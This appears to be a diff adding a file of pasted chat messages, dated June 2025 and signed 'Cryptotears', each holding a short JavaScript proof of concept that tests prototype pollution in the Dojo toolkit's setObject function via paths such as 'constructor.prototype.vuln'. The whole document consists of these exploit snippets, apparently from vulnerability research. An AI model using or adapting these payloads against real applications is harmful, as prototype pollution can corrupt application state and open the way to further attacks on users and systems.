@@ -1,0 +1,13 @@
+Cryptotears, [26.06.2025 12:27]
+const obj = {};
+dojo.setObject("constructor.prototype.vuln", "polluted!", obj);
+console.log({}.vuln);
+
+Cryptotears, [26.06.2025 12:28]
+const obj = {};
+dojo.setObject("foo.prototype.bar", "polluted!", obj);
+console.log({}.bar);
+
+Cryptotears, [26.06.2025 12:28]
+dojo.setObject("proto.vuln", "polluted!", {});
+console.log(Object.prototype);
